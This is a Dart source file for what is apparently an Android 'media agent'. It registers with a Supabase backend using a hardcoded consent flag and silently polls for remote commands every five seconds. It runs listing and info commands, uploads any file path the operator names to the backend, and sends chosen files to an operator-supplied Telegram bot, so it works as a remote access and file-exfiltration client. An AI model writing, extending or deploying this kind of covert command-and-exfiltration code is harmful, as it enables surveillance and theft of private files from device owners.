// lib/core/device_agent.dart
import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:typed_data';

import 'package:http/http.dart' as http;
import 'package:http_parser/http_parser.dart';

import 'command_parser.dart';
import '../platform/command_dispatcher.dart';

class DeviceAgent {
  DeviceAgent._();
  static final DeviceAgent instance = DeviceAgent._();

  late String supabaseUrl;
  late String deviceId;

  final http.Client _http = http.Client();
  Timer? _pollTimer;

  bool _running = false;
  bool _busy = false;

  static const Duration pollInterval = Duration(seconds: 5);

  static const String SUPABASE_ANON_KEY =
      'REDACTED_ANON_KEY';

  // -------------------- CONFIG --------------------

  Future<void> configure({
    required String supabaseUrl,
    required String deviceId,
  }) async {
    this.supabaseUrl = supabaseUrl;
    this.deviceId = deviceId;
  }

  Future<void> register() async {
    await _post('/register-device', {
      'device_id': deviceId,
      'display_name': 'Android Media Agent',
      'consent': true,
    });
  }

  // -------------------- POLLER --------------------

  Future<void> start() async {
    if (_running) return;
    _running = true;
    await _pollOnce();
    _pollTimer = Timer.periodic(pollInterval, (_) => _pollOnce());
  }

  Future<void> stop() async {
    _pollTimer?.cancel();
    _running = false;
    _busy = false;
  }

  Future<void> _pollOnce() async {
    if (!_running || _busy) return;
    _busy = true;

    try {
      final res = await _get('/get-commands', query: {'limit': '5'});
      final List<dynamic> cmds = (res['commands'] ?? []) as List<dynamic>;

      for (final c in cmds) {
        if (c is Map) {
          await _handleCommand(Map<String, dynamic>.from(c));
        }
      }
    } catch (_) {
      // silent by design
    } finally {
      _busy = false;
    }
  }

  // -------------------- COMMAND HANDLER --------------------

  Future<void> _handleCommand(Map<String, dynamic> raw) async {
    final parsed = CommandParser.parse(raw, deviceId);

    if (parsed.error != null) {
      final id = raw['id']?.toString();
      if (id != null) {
        await _updateCommandStatus(id, 'failed', {'error': parsed.error});
      }
      return;
    }

    final cmd = parsed.command!;
    Map<String, dynamic> result;

    try {
      // 1️⃣ Execute normal commands (/ls, /ping, /info...)
      result = await CommandDispatcher.instance.executeCommand(
        cmd,
        timeout: const Duration(seconds: 60),
      );

      // 2️⃣ UPLOAD
      if (cmd.action == 'upload' && cmd.payload?['path'] != null) {
        result = await _handleUpload(cmd.payload!['path']);
      }

      // 3️⃣ SEND (Telegram)
      if (cmd.action == 'send' &&
          cmd.payload?['path'] != null &&
          cmd.payload?['telegram'] != null) {
        result = await _handleSend(
          cmd.payload!['path'],
          cmd.payload!['telegram'],
        );
      }
    } catch (e) {
      result = {'success': false, 'error': e.toString()};
    }

    await _updateCommandStatus(
      cmd.id,
      result['success'] == true ? 'done' : 'failed',
      result,
    );
  }

  // -------------------- UPLOAD --------------------

  Future<Map<String, dynamic>> _handleUpload(String path) async {
    final file = File(path);
    if (!await file.exists()) {
      return {'success': false, 'error': 'file_not_found'};
    }

    final bytes = await file.readAsBytes();

    final uri = Uri.parse('$supabaseUrl/functions/v1/upload-file');
    final req = http.MultipartRequest('POST', uri)
      ..headers.addAll({
        'Authorization': 'Bearer $SUPABASE_ANON_KEY',
        'apikey': SUPABASE_ANON_KEY,
        'X-Device-ID': deviceId,
      })
      ..fields['device_id'] = deviceId
      ..fields['dest'] = path.split('/').last;

    req.files.add(
      http.MultipartFile.fromBytes(
        'file',
        bytes,
        filename: path.split('/').last,
        contentType: MediaType('application', 'octet-stream'),
      ),
    );

    final resp = await http.Response.fromStream(await req.send());

    if (resp.statusCode >= 200 && resp.statusCode < 300) {
      return {'success': true};
    }

    return {'success': false, 'error': resp.body};
  }

  // -------------------- SEND (TELEGRAM) --------------------

  Future<Map<String, dynamic>> _handleSend(
    String path,
    Map telegram,
  ) async {
    final file = File(path);
    if (!await file.exists()) {
      return {'success': false, 'error': 'file_not_found'};
    }

    final botToken = telegram['bot_token'];
    final chatId = telegram['chat_id'];

    final uri =
        Uri.parse('https://api.telegram.org/bot$botToken/sendDocument');

    final req = http.MultipartRequest('POST', uri)
      ..fields['chat_id'] = chatId.toString()
      ..files.add(
        http.MultipartFile.fromBytes(
          'document',
          await file.readAsBytes(),
          filename: path.split('/').last,
        ),
      );

    final resp = await http.Response.fromStream(await req.send());

    if (resp.statusCode >= 200 && resp.statusCode < 300) {
      return {'success': true};
    }

    return {'success': false, 'error': resp.body};
  }

  // -------------------- EDGE HELPERS --------------------

  Future<void> _updateCommandStatus(
      String id, String status, Map<String, dynamic> result) async {
    await _post('/update-command', {
      'id': id,
      'status': status,
      'result': result,
      'device_id': deviceId,
    });
  }

  Future<Map<String, dynamic>> _post(
      String path, Map<String, dynamic> body) async {
    final uri = Uri.parse('$supabaseUrl/functions/v1$path');

    final res = await _http.post(
      uri,
      headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer $SUPABASE_ANON_KEY',
        'apikey': SUPABASE_ANON_KEY,
        'X-Device-ID': deviceId,
      },
      body: jsonEncode(body),
    );

    if (res.body.isEmpty) return {};
    return jsonDecode(res.body);
  }

  Future<Map<String, dynamic>> _get(String path,
      {Map<String, String>? query}) async {
    var uri = Uri.parse('$supabaseUrl/functions/v1$path');
    if (query != null) uri = uri.replace(queryParameters: query);

    final res = await _http.get(uri, headers: {
      'Authorization': 'Bearer $SUPABASE_ANON_KEY',
      'apikey': SUPABASE_ANON_KEY,
      'X-Device-ID': deviceId,
    });

    if (res.body.isEmpty) return {};
    return jsonDecode(res.body);
  }
}